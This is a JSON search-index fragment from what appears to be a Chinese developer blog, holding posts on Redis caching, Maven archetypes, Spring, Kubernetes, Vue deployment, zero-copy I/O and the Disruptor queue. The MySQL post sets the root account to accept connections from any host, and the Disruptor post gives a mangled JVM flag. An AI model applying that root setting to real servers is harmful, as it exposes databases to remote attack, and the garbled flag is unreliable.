变化频繁且key非法）：布隆过滤器是一个非常神奇的数据结构，通过它我们可以非常方便地判断一个给定数据是否存在与海量数据中。我们需要的就是判断 key 是否合法，有没有感觉布隆过滤器就是我们想要找的那个“人”。具体是这样做的：把所有可能存在的请求的值都存放在布隆过滤器中，当用户请求过来，我会先判断用户发来的请求的值是否存在于布隆过滤器中。不存在的话，直接返回请求参数错误信息给客户端，存在的话才会走下面的流程。总结一下就是下面这张图(这张图片不是我画的，为了省事直接在网上找的)：  但是，需要注意的是布隆过滤器可能会存在误判的情况。总结来说就是： 布隆过滤器说某个元素存在，小概率会误判。布隆过滤器说某个元素不在，那么这个元素一定不在。\n 缓存预热（解决请求的 key 变化频繁且key合法）：提前将需要做缓存的数据放入redis，即缓存预热。  3. 消息队列削峰填谷 如果刚上线某个功能，大量用户同时点这个功能，并发量大的话，请求走到后台，那么写库的操作就非常多，数据库连接数突然激增，数据库会顶不住吧。\n所以为避免流量集中落到数据库，此时我们可以使用消息队列MQ。将插入操作的请求发往消息队列，使插入操作以一定的速率到数据库执行，使得对数据库的请求数尽量平滑，消息发给消息队列立即返回给前端成功，不用等待插库完成，用MQ实现了异步解耦，削峰填谷。\n参考： 缓存雪崩和缓存穿透问题解决方案 从一个小需求感受Redis的独特魅力 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/redis/%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9%E5%92%8C%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F/","series":["Manual"],"tags":["Redis"],"title":"缓存雪崩和缓存穿透"},{"categories":["编程思想"],"content":"1. 什么是java脚手架 其实就是java工程模板，你可以把一些通用的组件抽象成一个模板，下次开发的时候基于这个模板开发，避免重复造轮子。像apache默认就提供了很多模板（archetype）\n2. 创建archetype 假如你已经有了一个maven项目，想给该项目创建一个archetype模板。你需要cd 到项目根目录下执行(pom.xml同级目录)。\nmvn archetype:create-from-project 执行完后，生成的target类似这样：\n3. 生成archetype模板 先cd target/generated-sources/archetype/ 然后执行：\nmvn install 执行成功后，执行crawl命令：\nmvn archetype:crawl 在本地仓库的根目录生成archetype-catalog.xml骨架配置文件:\n来看一看它里面的内容:\n4. 使用archetype模板 执行mvn archetype:generate -DarchetypeCatalog=local从本地archetype模板中创建项目。\nmvn archetype:generate -DarchetypeCatalog=local 然后会让你选择模板序号和groupId artifactId version和package信息：\n至此，项目创建成功!\n当然，也可以使用IDEA来帮我们用图形界面使用archetype模板创建项目：\n这里的信息根据archetype-catalog.xml中的填写，如果是本地导入Repository可以不填或者填\u0026rsquo;local'。既然提到本地，那么自然可以想到，可以将脚手架发布到nexus私服。发布到私服可以参看这里：https://www.cnblogs.com/woshimrf/p/maven-artifact-demo.html\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E8%84%9A%E6%89%8B%E6%9E%B6/","series":["Manual"],"tags":["Java"],"title":"脚手架"},{"categories":["编程思想"],"content":"当请求形如：/opendoc/jquery-1.10.2.min.js 的静态资源时，如果恰好存在匹配这个请求的Controller时，默认情况下，这个静态资源请求会被 RequestMappingHandlerMapping 分配给这个Controller处理，从而可能找不到静态资源，例如存在下面这样的Controller：\n@RequestMapping(value = \u0026#34;/{name}/{version}\u0026#34;, method = {RequestMethod.POST, RequestMethod.GET}) public void rest3(@PathVariable(\u0026#34;name\u0026#34;) String name, @PathVariable(\u0026#34;version\u0026#34;) String version, HttpServletRequest request, HttpServletResponse response) { this.doRest(name, version, request, response); } 为了能正确匹配的静态资源，我们可以调整Spring HandlerMapping的顺序，让SimpleUrlHandlerMapping先于RequestMappingHandlerMapping去匹配请求，SimpleUrlHandlerMapping会返回一个用于加载静态资源的ResourceHttpRequestHandler\n默认情况下RequestMappingHandlerMapping 先于SimpleUrlHandlerMapping匹配请求，DispatcherServlet中初始化HandlerMapping的顺序源码如下所示：\n/** * Initialize the HandlerMappings used by this class. * \u0026lt;p\u0026gt;If no HandlerMapping beans are defined in the BeanFactory for this namespace, * we default to BeanNameUrlHandlerMapping. */ private void initHandlerMappings(ApplicationContext context) { this.handlerMappings = null; if (this.detectAllHandlerMappings) { // Find all HandlerMappings in the ApplicationContext, including ancestor contexts. \tMap\u0026lt;String, HandlerMapping\u0026gt; matchingBeans = BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerMapping.class, true, false); if (!matchingBeans.isEmpty()) { this.handlerMappings = new ArrayList\u0026lt;\u0026gt;(matchingBeans.values()); // We keep HandlerMappings in sorted order. \tAnnotationAwareOrderComparator.sort(this.handlerMappings); } } else { try { HandlerMapping hm = context.getBean(HANDLER_MAPPING_BEAN_NAME, HandlerMapping.class); this.handlerMappings = Collections.singletonList(hm); } catch (NoSuchBeanDefinitionException ex) { // Ignore, we\u0026#39;ll add a default HandlerMapping later. \t} } // Ensure we have at least one HandlerMapping, by registering \t// a default HandlerMapping if no other mappings are found. \tif (this.handlerMappings == null) { this.handlerMappings = getDefaultStrategies(context, HandlerMapping.class); if (logger.isTraceEnabled()) { logger.trace(\u0026#34;No HandlerMappings declared for servlet \u0026#39;\u0026#34; + getServletName() + \u0026#34;\u0026#39;: using default strategies from DispatcherServlet.properties\u0026#34;); } } } 默认情况下RequestMappingHandlerMapping 先于SimpleUrlHandlerMapping匹配请求：\n调整HandlerMapping顺序：\n@Configuration public class WebConfiguration extends WebMvcConfigurationSupport { @Override public void addResourceHandlers(ResourceHandlerRegistry registry){ registry.addResourceHandler(\u0026#34;/opendoc/**\u0026#34;).addResourceLocations(\u0026#34;/opendoc/\u0026#34;); registry.setOrder(0); } @Override @Bean public RequestMappingHandlerMapping requestMappingHandlerMapping(ContentNegotiationManager contentNegotiationManager, FormattingConversionService conversionService, ResourceUrlProvider resourceUrlProvider) { RequestMappingHandlerMapping handler = super.requestMappingHandlerMapping(contentNegotiationManager, conversionService, resourceUrlProvider); handler.setOrder(1); return handler; } } order值越小，优先级越高。\n调整之后的HandlerMapping顺序：\n此时，SimpleUrlHandlerMapping会返回一个用于加载静态资源的ResourceHttpRequestHandler\n参考链接🔗： Spring - Set HandlerMapping Priority ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/%E8%B0%83%E6%95%B4spring-handlermapping%E7%9A%84%E9%A1%BA%E5%BA%8F/","series":["Manual"],"tags":["Spring"],"title":"调整Spring HandlerMapping的顺序"},{"categories":["云原生"],"content":"部署sentinel-dashboard\n1. 构建镜像 FROMopenjdk:8-jdk-alpineVOLUME/tmpADD sentinel-dashboard-1.8.0.jar sentinel-dashboard.jarCMD java ${JAVA_OPTS} -jar sentinel-dashboard.jarEXPOSE87182. 创建headless service apiVersion: v1 kind: Service metadata: name: sentinel-headless labels: app: sentinel annotations: service.alpha.kubernetes.io/tolerate-unready-endpoints: \u0026#34;true\u0026#34; spec: ports: - port: 8718 name: server targetPort: 8718 clusterIP: None selector: app: sentinel 3. 创建StatefulSet apiVersion: apps/v1 kind: StatefulSet metadata: name: sentinel spec: serviceName: sentinel replicas: 1 template: metadata: labels: app: sentinel annotations: pod.alpha.kubernetes.io/initialized: \u0026#34;true\u0026#34; spec: containers: - name: sentinel imagePullPolicy: IfNotPresent image: ccr.ccs.tencentyun.com/xuzhijun/sentinel-dashboard:latest resources: requests: memory: \u0026#34;512Mi\u0026#34; cpu: \u0026#34;200m\u0026#34; ports: - containerPort: 8719 name: client env: - name: TZ value: Asia/Shanghai - name: JAVA_OPTS value: \u0026#34;-Dserver.port=8718 -Dcsp.sentinel.dashboard.server=localhost:8718 -Dproject.name=sentinel-dashboard -Djava.security.egd=file:/dev/./urandom -Dcsp.sentinel.api.port=8719\u0026#34; imagePullSecrets: - name: registry-secret-tencent selector: matchLabels: app: sentinel 4. 通过Ingress暴露服务 apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: ingress-yshopcloud annotations: kubernetes.io/ingress.class: \u0026#34;nginx\u0026#34; # 开启use-regex，启用path的正则匹配 nginx.ingress.kubernetes.io/use-regex: \u0026#34;true\u0026#34; spec: rules: # 定义域名 - host: sentinel.6and.ltd http: paths: # 不同path转发到不同端口 - path: / backend: serviceName: sentinel-headless servicePort: 8718 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/%E9%83%A8%E7%BD%B2sentinel-dashboard/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"部署sentinel-dashboard"},{"categories":["编程思想"],"content":"时常我们想通过path来区分项目，例如通过 http://xxxx/admin 访问我们的后台，如果vue是的mode是history，请注意如下配置：\n 修改vue-config.js文件配置  module.exports = {publicPath: \u0026#34;\u0026#34;}; 修改路由route/index  const router = new Router({ base: \u0026#39;/admin/\u0026#39;, //路由模式为history模式时，base必须要加上;路由模式为hash模式时，base可加可不加  mode: \u0026#39;history\u0026#39;, routes: [] } 此时，请求是形如 http://xxxx/admin/xxx.css，从而避免出现形如http://xxxx/xxx.css找不到资源的情况。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/nginx/%E9%83%A8%E7%BD%B2vue%E9%A1%B9%E7%9B%AE/","series":["Manual"],"tags":["nginx"],"title":"部署vue项目"},{"categories":["编程思想"],"content":"阿里面试，问了我乐观锁、悲观锁、AQS、sync和Lock，这个回答让我拿了offer 阿里面试官：说一下公平锁和非公平锁的区别？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E9%94%81/","series":["Manual"],"tags":["Java"],"title":"锁"},{"categories":["其他"],"content":"1）use mysql 2）将host设置为%表示任何ip都能连接mysql update user set host=\u0026#39;%\u0026#39; where user=\u0026#39;root\u0026#39; and host=\u0026#39;localhost\u0026#39;; 3) 执行完以上语句,接着执行以下语句 ,刷新权限表,使配置生效 flush privileges; 参考链接： 阿里云下配置MySQL远程连接的步骤详解 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/%E9%98%BF%E9%87%8C%E4%BA%91%E4%B8%8B%E9%85%8D%E7%BD%AEmysql%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/","series":["Manual"],"tags":["Other"],"title":"阿里云下配置MySQL远程连接"},{"categories":["编程思想"],"content":"简介 零拷贝的“零”是指用户态和内核态间copy数据的次数为零。\n传统的数据copy（文件到文件、client到server等）涉及到四次用户态内核态切换、四次copy。四次copy中，两次在用户态和内核态间copy需要CPU参与、两次在内核态与IO设备间copy为DMA方式不需要CPU参与。零拷贝避免了用户态和内核态间的copy、减少了Java零拷贝机制解析核态间的切换。\n DMA(Direct Memory Access，直接内存存取) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于CPU 的大量中断负载。 DMA控制器，接管了数据读写请求，减少CPU的负担。这样一来，CPU能高效工作了。 现代硬盘基本都支持DMA。\n 使用Zero Copy前后对比：\n使用前：\n使用后：\nLinux支持的(常见)零拷贝 mmap内存映射 sendfile Sendfile With DMA Scatter/Gather Copy splice\n无论是传统IO方式，还是引入零拷贝之后，2次DMA copy 是都少不了的。因为两次DMA都是依赖硬件完成的。\n实际上，零拷贝时有广义和狭义之分的。 广义零拷贝： 能减少拷贝次数，减少不必要的数据拷贝，就算作“零拷贝”。 这是目前，对零拷贝最为广泛的定义，我们需要知道的是，这是广义上的零拷贝，并不是操作系统 意义上的零拷贝。\nJava零拷贝机制解析 Linux提供的领拷贝技术 Java并不是全支持，支持2种(内存映射mmap、sendfile)；\nNIO提供的内存映射：MappedByteBuffer\nNIO提供的sendfile：FileChannel.transferTo() FileChannel.transferFrom()\n适用场景 数据不需要应用程序计算处理的场景，例如：访问静态资源\n参考 Java中的零拷贝 Java零拷贝 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E9%9B%B6%E6%8B%B7%E8%B4%9D/","series":["Manual"],"tags":["Java"],"title":"零拷贝"},{"categories":["编程思想"],"content":"1. JDK中的队列 在jdk中的队列都实现了java.util.Queue接口，在队列中又分为两类，一类是线程不安全的，ArrayDeque，LinkedList等等，还有一类都在java.util.concurrent包下属于线程安全，而在我们真实的环境中，我们的机器都是属于多线程，当多线程对同一个队列进行排队操作的时候，如果使用线程不安全会出现，覆盖数据，数据丢失等无法预测的事情，所以我们这个时候只能选择线程安全的队列。在jdk中提供的线程安全的队列下面简单列举部分队列:\n   队列名字 是否加锁 数据结构 关键技术点 是否有锁 是否有界     ArrayBlockingQueue 是 数组array ReentrantLock 有锁 有界   LinkedBlockingQueue 是 链表 ReentrantLock 有锁 有界   LinkedTransferQueue 否 链表 CAS 无锁 无界   ConcurrentLinkedQueue 否 链表 CAS 无锁 无界    我们可以看见，我们无锁的队列是无界的，有锁的队列是有界的，这里就会涉及到一个问题，我们在真正的线上环境中，无界的队列，对我们系统的影响比较大，有可能会导致我们内存直接溢出，所以我们首先得排除无界队列，当然并不是无界队列就没用了，只是在某些场景下得排除。其次还剩下ArrayBlockingQueue，LinkedBlockingQueue两个队列，他们两个都是用ReentrantLock控制的线程安全，他们两个的区别一个是数组，一个是链表，在队列中，一般获取这个队列元素之后紧接着会获取下一个元素，或者一次获取多个队列元素都有可能，而数组在内存中地址是连续的，在操作系统中会有缓存的优化(下面也会介绍缓存行)，所以访问的速度会略胜一筹，我们也会尽量去选择ArrayBlockingQueue。而事实证明在很多第三方的框架中，比如早期的log4j异步，都是选择的ArrayBlockingQueue。\n当然ArrayBlockingQueue，也有自己的弊端，就是性能比较低，为什么jdk会增加一些无锁的队列，其实就是为了增加性能，很苦恼，又需要无锁，又需要有界，这个时候恐怕会忍不住说一句你咋不上天呢？但是还真有人上天了。\n2.Disruptor Disruptor就是上面说的那个天，Disruptor是英国外汇交易公司LMAX开发的一个高性能队列，并且是一个开源的并发框架，并获得2011Duke’s程序框架创新奖。能够在无锁的情况下实现网络的Queue并发操作，基于Disruptor开发的系统单线程能支撑每秒600万订单。目前，包括Apache Storm、Camel、Log4j2等等知名的框架都在内部集成了Disruptor用来替代jdk的队列，以此来获得高性能。\n3.1为什么这么牛逼？ 上面已经把Disruptor吹出了花了，你肯定会产生疑问，他真的能有这么牛逼吗，我的回答是当然的，在Disruptor中有三大杀器:\n  CAS\n  消除伪共享\n  RingBuffer\n  有了这三大杀器，Disruptor才变得如此牛逼。\n3.1.1 锁和CAS CAS实现无锁队列可以参考👉无锁队列的实现 我们ArrayBlockingQueue为什么会被抛弃的一点，就是因为用了重量级lock锁，在我们加锁过程中我们会把锁挂起，解锁后，又会把线程恢复,这一过程会有一定的开销，并且我们一旦没有获取锁，这个线程就只能一直等待，这个线程什么事也不能做。\nCAS（compare and swap），顾名思义先比较在交换，一般是比较是否是老的值，如果是的进行交换设置，大家熟悉乐观锁的人都知道CAS可以用来实现乐观锁，CAS中没有线程的上下文切换，减少了不必要的开销。 这里使用JMH，用两个线程，每次1一次调用，在我本机上进行测试，代码如下:\n@BenchmarkMode({Mode.SampleTime}) @OutputTimeUnit(TimeUnit.MILLISECONDS) @Warmup(iterations=3, time = 5, timeUnit = TimeUnit.MILLISECONDS) @Measurement(iterations=1,batchSize = 100000000) @Threads(2) @Fork(1) @State(Scope.Benchmark) public class Myclass { Lock lock = new ReentrantLock(); long i = 0; AtomicLong atomicLong = new AtomicLong(0); @Benchmark public void measureLock() { lock.lock(); i++; lock.unlock(); } @Benchmark public void measureCAS() { atomicLong.incrementAndGet(); } @Benchmark public void measureNoLock() { i++; } } 测试出来结果如下:\n   测试项目 测试结果     Lock 26000ms   CAS 4840ms   无锁 197ms    可以看见Lock是五位数，CAS是四位数，无锁更小是三位数。 由此我们可以知道Lock\u0026gt;CAS\u0026gt;无锁。\n而我们的Disruptor中使用的就是CAS，他利用CAS进行队列中的一些下标设置，减少了锁的冲突，提高了性能。\n另外对于jdk中其他的无锁队列也是使用CAS，原子类也是使用CAS。\n3.1.2 伪共享 谈到了伪共享就不得不说计算机CPU缓存,缓存大小是CPU的重要指标之一，而且缓存的结构和大小对CPU速度的影响非常大，CPU内缓存的运行频率极高，一般是和处理器同频运作，工作效率远远大于系统内存和硬盘。实际工作时，CPU往往需要重复读取同样的数据块，而缓存容量的增大，可以大幅度提升CPU内部读取数据的命中率，而不用再到内存或者硬盘上寻找，以此提高系统性能。但是从CPU芯片面积和成本的因素来考虑，缓存都很小。\nCPU缓存可以分为一级缓存，二级缓存，如今主流CPU还有三级缓存，甚至有些CPU还有四级缓存。每一级缓存中所储存的全部数据都是下一级缓存的一部分，这三种缓存的技术难度和制造成本是相对递减的，所以其容量也是相对递增的。\n为什么CPU会有L1、L2、L3这样的缓存设计？主要是因为现在的处理器太快了，而从内存中读取数据实在太慢（一个是因为内存本身速度不够，另一个是因为它离CPU太远了，总的来说需要让CPU等待几十甚至几百个时钟周期），这个时候为了保证CPU的速度，就需要延迟更小速度更快的内存提供帮助，而这就是缓存。对这个感兴趣可以把电脑CPU拆下来，自己把玩一下。\n每一次你听见intel发布新的cpu什么,比如i7-7700k,8700k，都会对cpu缓存大小进行优化，感兴趣可以自行下来搜索，这些的发布会或者发布文章。\nMartin和Mike的 QCon presentation演讲中给出了一些每个缓存时间：\n   从CPU到 大约需要的CPU周期 大约需要的时间     主存  约60-80纳秒   QPI 总线传输(between sockets, not drawn)  约20ns   L3 cache 约40-45 cycles 约15ns   L2 cache 约10 cycles 约3ns   L1 cache 约3-4 cycles 约1ns   寄存器  1 cycle    缓存行 关于cache-line更细致的介绍请移步 👉👉 JAVA 拾遗 — CPU Cache 与缓存行 在cpu的多级缓存中，并不是以独立的项来保存的，而是类似一种pageCahe的一种策略，以缓存行来保存，而缓存行的大小通常是64字节，在Java中Long是8个字节，所以可以存储8个Long,举个例子，你访问一个long的变量的时候，他会把帮助再加载7个，我们上面说为什么选择数组不选择链表，也就是这个原因，在数组中可以依靠缓冲行得到很快的访问。\n缓存行是万能的吗？NO，因为他依然带来了一个缺点，我在这里举个例子说明这个缺点，可以想象有个数组队列，ArrayQueue，他的数据结构如下:\nclass ArrayQueue{ long maxSize; long currentIndex; } 对于maxSize是我们一开始就定义好的，数组的大小，对于currentIndex，是标志我们当前队列的位置，这个变化比较快，假设你访问maxSize的时候，把currentIndex也加载进来了，这个时候，其他线程更新currentIndex,就会把cpu中的缓存行置位无效，请注意这是CPU规定的，他并不是只吧currentIndex置位无效，如果此时又继续访问maxSize他依然得继续从内存中读取，但是MaxSize却是我们一开始定义好的，我们应该访问缓存即可，但是却被我们经常改变的currentIndex所影响。\nPadding的魔法 为了解决上面缓存行出现的问题，在Disruptor中采用了Padding的方式，\nclass LhsPadding { protected long p1, p2, p3, p4, p5, p6, p7; } class Value extends LhsPadding { protected volatile long value; } class RhsPadding extends Value { protected long p9, p10, p11, p12, p13, p14, p15; } 其中的Value就被其他一些无用的long变量给填充了。这样你修改Value的时候，就不会影响到其他变量的缓存行。\n最后顺便一提，在jdk8中提供了@Contended的注解，当然一般来说只允许Jdk中内部，如果你自己使用那就得配置Jvm参数 -RestricContentended = fase，将限制这个注解置位取消。很多文章分析了ConcurrentHashMap，但是都把这个注解给忽略掉了，在ConcurrentHashMap中就使用了这个注解，在ConcurrentHashMap每个桶都是单独的用计数器去做计算，而这个计数器由于时刻都在变化，所以被用这个注解进行填充缓存行优化，以此来增加性能。\n3.1.3 RingBuffer 在Disruptor中采用了数组的方式保存了我们的数据，上面我们也介绍了采用数组保存我们访问时很好的利用缓存，但是在Disruptor中进一步选择采用了环形数组进行保存数据，也就是RingBuffer。在这里先说明一下环形数组并不是真正的环形数组，在RingBuffer中是采用取余的方式进行访问的，比如数组大小为 10，0访问的是数组下标为0这个位置，其实10，20等访问的也是数组的下标为0的这个位置。\n当然其不仅解决了数组快速访问的问题，也解决了不需要再次分配内存的问题，减少了垃圾回收，因为我们0，10，20等都是执行的同一片内存区域，这样就不需要再次分配内存，频繁的被JVM垃圾回收器回收。\n自此三大杀器已经说完了，有了这三大杀器为Disruptor如此高性能垫定了基础。接下来还会在讲解如何使用Disruptor和Disruptor的具体的工作原理。\n3.2 Disruptor怎么使用 下面举了一个简单的例子:\npublic static void main(String[] args) throws Exception { // 队列中的元素  class Element { @Contended private String value; public String getValue() { return value; } public void setValue(String value) { this.value = value; } } // 生产者的线程工厂  ThreadFactory threadFactory = new ThreadFactory() { int i = 0; @Override public Thread newThread(Runnable r) { return new Thread(r, \u0026#34;simpleThread\u0026#34; + String.valueOf(i++)); } }; // RingBuffer生产工厂,初始化RingBuffer的时候使用  EventFactory\u0026lt;Element\u0026gt; factory = new EventFactory\u0026lt;Element\u0026gt;() { @Override public Element newInstance() { return new Element(); } }; // 处理Event的handler  EventHandler\u0026lt;Element\u0026gt; handler = new EventHandler\u0026lt;Element\u0026gt;() { @Override public void onEvent(Element element, long sequence, boolean endOfBatch) throws InterruptedException { System.out.println(\u0026#34;Element: \u0026#34; + Thread.currentThread().getName() + \u0026#34;: \u0026#34; + element.getValue() + \u0026#34;: \u0026#34; + sequence); // Thread.sleep(10000000);  } }; // 阻塞策略  BlockingWaitStrategy strategy = new BlockingWaitStrategy(); // 指定RingBuffer的大小  int bufferSize = 8; // 创建disruptor，采用单生产者模式  Disruptor\u0026lt;Element\u0026gt; disruptor = new Disruptor(factory, bufferSize, threadFactory, ProducerType.SINGLE, strategy); // 设置EventHandler  disruptor.handleEventsWith(handler); // 启动disruptor的线程  disruptor.start(); for (int i = 0; i \u0026lt; 10; i++) { disruptor.publishEvent((element, sequence) -\u0026gt; { System.out.println(\u0026#34;之前的数据\u0026#34; + element.getValue() + \u0026#34;当前的sequence\u0026#34; + sequence); element.setValue(\u0026#34;我是第\u0026#34; + sequence + \u0026#34;个\u0026#34;); }); } } 在Disruptor中有几个比较关键的:\nThreadFactory：这是一个线程工厂，用于我们Disruptor中生产者消费的时候需要的线程。\nEventFactory：事件工厂，用于产生我们队列元素的工厂，在Disruptor中，他会在初始化的时候直接填充满RingBuffer，一次到位。\nEventHandler：用于处理Event的handler，这里一个EventHandler可以看做是一个消费者，但是多个EventHandler他们都是独立消费的队列。\nWorkHandler：也是用于处理Event的handler，和上面区别在于，多个消费者都是共享同一个队列。\nWaitStrategy：等待策略，在Disruptor中有多种策略，来决定消费者获消费时，如果没有数据采取的策略是什么？下面简单列举一下Disruptor中的部分策略\n BlockingWaitStrategy：通过线程阻塞的方式，等待生产者唤醒，被唤醒后，再循环检查依赖的sequence是否已经消费。 BusySpinWaitStrategy：线程一直自旋等待，可能比较耗cpu LiteBlockingWaitStrategy：线程阻塞等待生产者唤醒，与BlockingWaitStrategy相比，区别在signalNeeded.getAndSet,如果两个线程同时访问一个访问waitfor,一个访问signalAll时，可以减少lock加锁次数. LiteTimeoutBlockingWaitStrategy：与LiteBlockingWaitStrategy相比，设置了阻塞时间，超过时间后抛异常。 YieldingWaitStrategy：尝试100次，然后Thread.yield()让出cpu  EventTranslator：实现这个接口可以将我们的其他数据结构转换为在Disruptor中流通的Event。\n参考 无锁队列的实现 你应该知道的高性能无锁队列Disruptor ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/other/%E9%AB%98%E6%80%A7%E8%83%BD%E6%97%A0%E9%94%81%E9%98%9F%E5%88%97disruptor/","series":["Manual"],"tags":["Other"],"title":"高性能无锁队列Disruptor"},{"categories":null,"content":"我是 Razon Yang，一名全栈工程师。\n贡献         项目          ","date":"2016-02-19","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/about/","series":null,"tags":null,"title":"关于"}]